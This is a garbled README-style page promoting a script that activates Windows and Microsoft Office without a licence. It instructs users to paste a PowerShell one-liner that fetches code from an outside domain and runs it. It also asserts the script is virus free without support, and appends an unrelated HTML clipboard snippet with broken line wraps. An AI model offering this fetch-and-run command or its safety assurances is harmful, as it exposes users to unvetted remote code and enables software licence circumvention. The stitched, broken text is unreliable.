# microsoft-activation
You can used this script for activating Windows and Microsoft Office
Method 1 - PowerShell (Windows 8 and later)
1. Open PowerShell (Not CMD). To do that, right-click on the Windows start menu and select PowerShell or Terminal.
2. Copy and paste the code below and press enter
function test() {
  console.log("irm https://get.activated.win | iex");
}
3. You will see the activation options. Choose (1) HWID for Windows activation. Choose (2) Ohook for Office activation.
4. That's all.
More options

Now your Windows or Office si activate
This script is totally virus free
You do not need to turn off windows defender
<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport"

content="width=device-width,

initial-scale=1.0">

<title>Copy to Clipboard Example</title>

</head>

<body>

<textarea id="codeSnippet" rows="4"

cols="50">

irm https://get.activated.win | iex

</textarea>

<br>

<button onclick="copyToClipboard()">Copy to

Clipboard</button>

<script>

function copyToClipboard() {

// Get the text field

var copyText =

document.getElementById("codeSnippet");

// Select the text field

copyText.select();

copyText.setSelectionRange(0,

99999); // For mobile devices

// Copy the text inside the text

field

navigator.clipboard.writeTe

xt(copyText.value).then(function()

{

alert("Copied to clipboard!");

}, function(err) {

console.error("Could not copy

text: ", err);

});

}

</script>

</body>

</html>
